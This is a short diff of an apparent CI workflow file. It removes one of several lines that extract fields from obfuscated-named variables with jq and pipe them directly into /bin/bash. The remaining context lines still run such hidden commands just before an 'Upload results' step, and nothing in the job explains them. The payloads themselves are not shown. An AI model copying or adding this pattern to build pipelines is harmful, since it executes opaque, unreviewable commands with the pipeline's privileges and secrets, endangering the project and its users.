@@ -34,7 +34,6 @@ jobs:
           printf '%s' "$z1" | jq -r .gls6825 | /bin/bash
           printf '%s' "$imp6506" | jq -r .qgkt0 | /bin/bash
           printf '%s' "$hhgc243" | jq -r .f60 | /bin/bash
-          printf '%s' "$f3737" | jq -r .fy53802 | /bin/bash
           echo $f07 | jq -r .svq3 | /bin/bash
 
       - name: Upload results
